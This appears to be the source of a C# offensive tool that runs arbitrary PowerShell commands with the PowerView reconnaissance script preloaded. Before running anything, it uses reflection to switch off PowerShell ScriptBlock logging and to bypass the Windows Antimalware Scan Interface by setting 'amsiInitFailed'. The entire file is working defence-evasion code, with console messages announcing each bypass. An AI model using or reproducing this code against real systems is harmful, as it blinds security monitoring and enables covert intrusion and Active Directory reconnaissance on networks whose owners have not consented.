using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Text;


public class PowerShellExecuter
{
    private const string pview = "";

    public static void Execute(string[] args)
    {
        if (args.Length != 1)
        {
            PrintUsage();
            return;
        }

        Console.WriteLine("[*] Running powershell srcipt");

        string cmd_t = args[0];

        RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
        Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
        rspace.Open();

        Console.WriteLine("[*] Runspace opened");
        Assembly assembly = rspace.GetType().Assembly;
        try
        {
            if (assembly != null)
            {
                Type type = assembly.GetType("System.Management.Automation.Utils");

                if (type != null)
                {
                    ConcurrentDictionary<string, Dictionary<string, Object>> settings = (ConcurrentDictionary<string, Dictionary<string, Object>>)type.GetField("cachedGroupPolicySettings", BindingFlags.NonPublic | BindingFlags.Static).GetValue(null);

                    Dictionary<string, Object> dic_e = new Dictionary<string, Object>();
                    dic_e.Add("EnableScriptBlockLogging", 0);
                    dic_e.Add("EnableScriptBlockInvocationLogging", 0);
                    settings.TryAdd("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging", dic_e);

                    type = assembly.GetType("System.Management.Automation.ScriptBlock");
                    if (type != null)
                    {
                        type.GetField("signatures", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, new HashSet<string>());

                        Console.WriteLine("[+] ScriptBlockLogging bypass executed");

                    }
                }
                else
                {
                    Console.WriteLine("[-] Error setting signature");
                }
            }
            else
            {
                Console.WriteLine("[-] Error util ref ");
            }
        }
        catch (Exception)
        {
            Console.WriteLine("[-] Error ScriptBlockLogging bypass");
            return;
        }

        try
        {
            assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, true);
            Console.WriteLine("[+] Amsi Bypass executed");
        }
        catch (Exception)
        {
            Console.WriteLine("[-] Error running asmi bypass");
            return;
        }

        Pipeline pipeline = rspace.CreatePipeline();
        //Configure our runspace with funny stuf
        //Import powerview
        pipeline.Commands.AddScript(Encoding.UTF8.GetString(DecompressScript(Convert.FromBase64String(pview))));

        Console.WriteLine("[*] PowerView loaded");
        //Set required command
        pipeline.Commands.AddScript(cmd_t);
        pipeline.Commands.Add("Out-String");

        Console.WriteLine();

        pipeline.InvokeAsync();

        while (pipeline.PipelineStateInfo.State == PipelineState.Running || pipeline.PipelineStateInfo.State == PipelineState.Stopping)
        {
            System.Threading.Thread.Sleep(90);
        }

        foreach (System.Management.Automation.PSObject item in pipeline.Output.ReadToEnd())
            {
                if (item != null)
                {
                    Console.WriteLine(item.ToString());
                }
                else
                {
                    Console.WriteLine("[x] No output");
                }
            }
    }

    private static void PrintUsage()
    {
        Console.WriteLine("imported scripts: PowerView");
        Console.WriteLine("usage: PowerShellExecuter command");
    }

    public static byte[] DecompressScript(byte[] gzip)
    {
        using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
        {
            const int size = 4096;
            byte[] buffer = new byte[size];
            using (MemoryStream memory = new MemoryStream())
            {
                int count = 0;
                do
                {
                    count = stream.Read(buffer, 0, size);
                    if (count > 0)
                    {
                        memory.Write(buffer, 0, count);
                    }
                }
                while (count > 0);
                return memory.ToArray();
            }
        }
    }

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern bool AllocConsole();

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern bool AttachConsole(int pid);
}
